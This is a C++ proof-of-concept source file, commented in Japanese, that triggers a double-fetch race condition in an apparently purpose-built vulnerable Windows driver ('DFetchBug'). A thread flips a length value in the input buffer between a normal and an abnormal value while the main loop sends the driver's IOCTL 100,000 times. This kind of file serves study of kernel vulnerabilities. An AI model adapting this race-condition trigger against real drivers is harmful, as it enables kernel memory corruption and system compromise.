/* Double fetch bug PoC
 * 引数を指定するとスレッドを作らなくなる
 */
#include <cstdio>
#include <Windows.h>

char in_buf[0x10]; // 入力バッファ
char out_buf[0x10]; // 出力バッファ

#define IOCTL_DOUBLE_FETCH CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER,FILE_ANY_ACCESS)

DWORD WINAPI Changer(LPVOID lpParameter)
{
    auto pVuln = (DWORD*)lpParameter;
    printf("In thread.\n");
    while (true)
    {
        printf("T");
        // ただひたすらに脆弱なポインタ部分をフリップしまくるスレッド
        if (*pVuln == 5) *pVuln = 4649; // 異常値
        else *pVuln = 5; // 正常値
    }
}

void Attack(HANDLE h, bool trigger)
{
    printf("%p\n", in_buf);
    DWORD tid = 0;
    auto x = (DWORD*)in_buf;
    *x = 5;
    auto th = INVALID_HANDLE_VALUE;
    // フリップしまくるスレッドを用意する
    if (trigger) {
        th = CreateThread(NULL,
            0,
            Changer,
            in_buf, // partlen1のポインタ
            0,
            &tid
        );
    }
    /* 運良く発火することを祈りながら何回もDeviceIoControlを呼ぶ */
    printf("DeviceIoControl!\n");
    DWORD a = 0;
    for (auto i = 0; i < 100000; i++)
    {
        // printf("D");
        DeviceIoControl(h,
            IOCTL_DOUBLE_FETCH,
            x,
            0x10,
            out_buf,
            0x10,
            &a,
            NULL
        );
    }
    if (trigger) {
        // 10万回やったらスレッドを止める
        TerminateThread(th, 0);
    }

}

int main(int argc, char** argv)
{
    /* ドライバを開く */
    printf("CreateFile...");
    const auto hFile = CreateFile(L"\\\\.\\DFetchBug",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (hFile == INVALID_HANDLE_VALUE) {
        printf("failed: %d\n", GetLastError());
        return 0;
    }
    else {
        printf("success\n");
    }

    // trigger==trueのときにdouble fetchを起こす
    const auto trigger = argc != 2;
    printf("Sleep(3000)...");
    Sleep(3000);
    printf("done\n");

    Attack(hFile, trigger);

    // すぐ発火しないように3秒スリープ
    return 0;
}
